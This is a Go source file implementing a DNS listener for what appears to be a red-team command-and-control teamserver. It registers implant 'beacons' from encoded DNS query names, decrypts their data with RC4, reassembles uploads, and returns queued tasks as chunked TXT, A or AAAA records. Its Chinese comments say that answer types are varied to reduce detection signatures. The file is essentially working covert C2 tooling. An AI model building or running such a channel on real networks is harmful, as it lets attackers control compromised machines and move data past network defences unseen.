package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/base32"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"crypto/rc4"

	dns "github.com/miekg/dns"
)

// dnsDebug controls verbose logging for the DNS listener. It is disabled by
// default so that release builds remain quiet. Set to true temporarily when
// troubleshooting BeaconDNS behavior.
const dnsDebug = true

type dnsFragBuf struct {
	total  uint32
	buf    []byte
	filled uint32
}

type dnsDownBuf struct {
	total uint32
	off   uint32
	buf   []byte
}

type DNS struct {
	Config DNSConfig
	Name   string
	Active bool

	server *dns.Server
	ts     Teamserver

	mu        sync.Mutex
	upFrags   map[string]*dnsFragBuf
	downFrags map[string]*dnsDownBuf
}

func (d *DNS) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.QType == "" {
		d.Config.QType = "TXT"
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 1024
	}

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.server = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.ts = ts
	d.upFrags = make(map[string]*dnsFragBuf)
	d.downFrags = make(map[string]*dnsDownBuf)

	go func() {
		if err := d.server.ListenAndServe(); err != nil {
			if dnsDebug {
				fmt.Printf("[BeaconDNS] listener error: %v\n", err)
			}
		}
	}()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DNS) Stop() error {
	d.Active = false
	if d.server == nil {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	return d.server.ShutdownContext(ctx)
}

func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
	if sid == "" || len(data) == 0 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}
	if len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	total := binary.BigEndian.Uint32(data[0:4])
	offset := binary.BigEndian.Uint32(data[4:8])
	chunk := data[8:]

	const maxUploadSize = 4 << 20 // 4MB 上行限制，与 Beacon 端 ConnectorDNS 保持一致
	if total == 0 || total > maxUploadSize {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, chunk)
		return
	}

	key := sid

	d.mu.Lock()
	defer d.mu.Unlock()

	fb, ok := d.upFrags[key]
	if !ok {
		buf := make([]byte, total)
		fb = &dnsFragBuf{total: total, buf: buf}
		d.upFrags[key] = fb
	}
	if offset >= fb.total {
		return
	}
	end := offset + uint32(len(chunk))
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])
	fb.filled += n
	if fb.filled >= fb.total {
		_ = d.ts.TsAgentProcessData(sid, fb.buf)
		delete(d.upFrags, key)
	}
}

// 协议约定（简化版）：
// qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
// 其中 data = base32(no padding, upper) 的 RC4(payload)
// sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	ttl := uint32(d.Config.TTL)
	qtype := strings.ToUpper(d.Config.QType)

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if d.Config.Domain != "" {
			dom := strings.TrimSuffix(strings.ToLower(d.Config.Domain), ".")
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				if tail == dom {
					base = labels[:i]
					break
				}
			}
		}

		var sid, op string
		var seq, idx int
		var dataB []byte

		if len(base) >= 5 {
			sid = base[0]
			op = strings.ToUpper(base[1])
			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
				seq = int(v)
			}
			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
				idx = int(v)
			}

			_ = seq
			_ = idx

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		// basic anti-abuse validation: sid must be 8-char hex, and payload
		// size should not grow unbounded beyond configured packet size.
		if sid != "" {
			validSid := len(sid) == 8
			if validSid {
				for i := 0; i < 8; i++ {
					c := sid[i]
					if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
						validSid = false
						break
					}
				}
			}
			if !validSid {
				// invalid sid: do not treat as a beacon frame
				op = ""
			}
		}

		maxPayload := d.Config.PktSize * 4
		if maxPayload <= 0 {
			maxPayload = 4096
		}
		if len(dataB) > maxPayload {
			dataB = nil
		}

		if dnsDebug {
			remote := ""
			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
				remote = addr.IP.String()
			}
			fmt.Printf("[BeaconDNS] q from %s name=%s qtype=%d op=%s sid=%s seq=%d idx=%d len=%d\n",
				remote, q.Name, q.Qtype, op, sid, seq, idx, len(dataB))
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					// HI：尝试解出 beat 头，创建 Agent
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							fullBeat := make([]byte, len(dataB))
							c.XORKeyStream(fullBeat, dataB)
							if len(fullBeat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
								// HTTP 通道会把前 8 字节 (type+id) 剥离后再传给 AgentCreate，
								// DNS 这里也保持同样格式，只把剩余部分作为 beat 传入。
								beat := fullBeat[8:]
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
										externalIP = addr.IP.String()
									}
									if dnsDebug {
										fmt.Printf("[BeaconDNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				// PUT：将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
				if op == "PUT" {
					if dnsDebug {
						fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
					}
					// 应用层分片由 handlePutFragment 负责重组
					d.handlePutFragment(sid, seq, dataB)
					if sid != "" {
						_ = d.ts.TsAgentSetTick(sid)
					}
				}
			}
			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
			if qtype == "A" {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if qtype == "AAAA" {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}
			// 下行：从 TS 中取数据，并按 [total_len][offset][chunk] 做应用层分片
			var frame []byte
			if sid != "" {
				// 先尝试从缓存中取下行缓冲
				var df *dnsDownBuf
				d.mu.Lock()
				if buf, ok := d.downFrags[sid]; ok {
					df = buf
				}
				d.mu.Unlock()

				// 如果没有缓存或已发送完，则从 TS 获取新的打包任务
				if df == nil || df.off >= df.total {
					maxDataSize := d.Config.PktSize * 256
					if maxDataSize <= 0 || maxDataSize > (4<<20) {
						maxDataSize = 4 << 20
					}
					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
						if dnsDebug {
							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
						}
						origLen := len(p)
						flags := byte(0)
						payload := p

						// 针对较大的下行数据尝试使用 zlib 流压缩，减小 DNS 分片数量，并与 C++ miniz 解压保持兼容。
						const minCompressSize = 2048 // 仅对大于 2KB 的 payload 尝试压缩
						if origLen > minCompressSize {
							var zbuf bytes.Buffer
							w, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
							if errW == nil {
								if _, errC := w.Write(p); errC == nil && w.Close() == nil {
									comp := zbuf.Bytes()
									if len(comp) > 0 && len(comp) < origLen {
										payload = comp
										flags = 1
									}
								} else {
									_ = w.Close()
								}
							}
						}

						// 构造会话头：[flags][orig_len_le][payload]
						totalLen := 1 + 4 + len(payload)
						buf := make([]byte, totalLen)
						buf[0] = flags
						buf[1] = byte(origLen & 0xFF)
						buf[2] = byte((origLen >> 8) & 0xFF)
						buf[3] = byte((origLen >> 16) & 0xFF)
						buf[4] = byte((origLen >> 24) & 0xFF)
						copy(buf[5:], payload)
						df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf}

						d.mu.Lock()
						d.downFrags[sid] = df
						d.mu.Unlock()
					}
				}

				// 如果当前存在待发送的缓冲，则构造一个带头部的分片
				if df != nil && df.off < df.total {
					// 为了兼容 TXT RDATA 255 字节长度限制，这里控制每个分片大小。
					maxChunk := d.Config.PktSize
					if maxChunk <= 0 || maxChunk > 247 {
						maxChunk = 247
					}
					remaining := df.total - df.off
					chunkLen := remaining
					if chunkLen > uint32(maxChunk) {
						chunkLen = uint32(maxChunk)
					}

					frame = make([]byte, 8+chunkLen)
					binary.BigEndian.PutUint32(frame[0:4], df.total)
					binary.BigEndian.PutUint32(frame[4:8], df.off)
					copy(frame[8:], df.buf[df.off:df.off+chunkLen])

					if dnsDebug {
						firstEnd := 8 + 8
						if firstEnd > len(frame) {
							firstEnd = len(frame)
						}
						fmt.Printf("[BeaconDNS] GET frame sid=%s total=%d off=%d chunk=%d firstBytes=%x\n",
							sid,
							binary.BigEndian.Uint32(frame[0:4]),
							binary.BigEndian.Uint32(frame[4:8]),
							len(frame)-8,
							frame[8:firstEnd],
						)
					}

					df.off += chunkLen
					if df.off >= df.total {
						d.mu.Lock()
						delete(d.downFrags, sid)
						d.mu.Unlock()
					}
				}
			}

			// 根据是否有 frame 生成响应记录
			if len(frame) == 0 {
				// 空响应
				if qtype == "A" {
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
					m.Answer = append(m.Answer, rr)
				} else if qtype == "AAAA" {
					rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
					m.Answer = append(m.Answer, rr)
				} else {
					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
					m.Answer = append(m.Answer, rr)
				}
			} else {
				// 对于 TXT：直接返回 frame；对于 A/AAAA：按字节切分到相应 RDATA 中。
				if qtype == "A" {
					start := 0
					maxBytes := d.Config.PktSize
					if maxBytes%4 != 0 {
						maxBytes = maxBytes - (maxBytes % 4)
					}
					if maxBytes <= 0 {
						maxBytes = 4
					}
					endLimit := start + maxBytes
					if endLimit > len(frame) {
						endLimit = len(frame)
					}
					for start < endLimit {
						end := start + 4
						if end > endLimit {
							end = endLimit
						}
						chunk := make([]byte, 4)
						copy(chunk, frame[start:end])
						ip := net.IPv4(chunk[0], chunk[1], chunk[2], chunk[3])
						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: ip}
						m.Answer = append(m.Answer, rr)
						start = end
					}
				} else if qtype == "AAAA" {
					start := 0
					maxBytes := d.Config.PktSize
					if maxBytes%16 != 0 {
						maxBytes = maxBytes - (maxBytes % 16)
					}
					if maxBytes <= 0 {
						maxBytes = 16
					}
					endLimit := start + maxBytes
					if endLimit > len(frame) {
						endLimit = len(frame)
					}
					for start < endLimit {
						end := start + 16
						if end > endLimit {
							end = endLimit
						}
						chunk := make([]byte, 16)
						copy(chunk, frame[start:end])
						ip := net.IP(chunk)
						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
						m.Answer = append(m.Answer, rr)
						start = end
					}
				} else {
					// TXT: 直接用 frame 构造单条 TXT 记录
					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
					m.Answer = append(m.Answer, rr)
				}
			}

		default:
			// 未知 op：简单 keep-alive
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
